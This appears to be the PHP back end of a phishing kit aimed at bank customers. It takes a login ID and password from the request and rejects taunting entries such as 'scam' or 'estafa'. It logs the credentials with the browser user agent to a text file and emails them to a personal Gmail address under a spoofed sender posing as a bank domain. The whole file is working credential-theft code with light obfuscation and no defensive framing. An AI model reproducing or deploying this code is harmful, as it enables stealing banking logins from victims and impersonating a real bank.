<?php
error_reporting(0);
			
if(isset($_GET['pass'])){
if(empty($_GET['id'])){
echo '{"status":"error","errordescription":"Falta un parametro","number":"408"}';
exit();	
} else
if(strlen($_GET['pass']) < 6){
echo '{"status":"error","errordescription":"Contraseña inválida","number":"408"}';
exit();
} else
if(strpos($_GET['pass'], 'pene') || strpos($_GET['pass'], 'Pene') || strpos($_GET['pass'], 'mama') || strpos($_GET['pass'], 'Mama') || strpos($_GET['pass'], 'estafa') || strpos($_GET['pass'], 'Estafa') || strpos($_GET['pass'], 'scam') || strpos($_GET['pass'], 'Scam') || strpos($_GET['pass'], 'nueva') || strpos($_GET['pass'], ' ') || strpos($_GET['pass'], ' ')|| strpos($_GET['pass'], 'putos')){
echo '{"status":"error","errordescription":"Contraseña inválida","number":"408"}';
} else
	
echo '{"status":"success","errordescription":"none","number":"302"}';
 
$kOpD3ZelQ = fopen('pass-error.text','a+');
 $zPpD3ZelQ = fwrite($kOpD3ZelQ, "<hr></hr>IDENTIFICACION UNICA : ".$_GET['id']."</br>PASS ".$_GET['pass']."</br>AGENTE DE NAVEGACION ".$_SERVER['HTTP_USER_AGENT']."<hr></hr>");
 fclose($kOpD3ZelQ);
   $content .= "
IDENTIFICACION UNICA : ".$_GET['id']."
PASS ".$_GET['pass']."
AGENTE DE NAVEGACION ".$_SERVER['HTTP_USER_AGENT']."";

$recipient = "edgarlozolla1@gmail.com";
$subject = "Login MP ".$_GET['id']."";
$prefijo = substr(md5(uniqid(rand())),0,6);
$from = "From:Login Visa Home - $ip<$prefijo@bancobcr.com>";

mail($recipient,$subject,$content,$from);
			exit();
}		
			?>
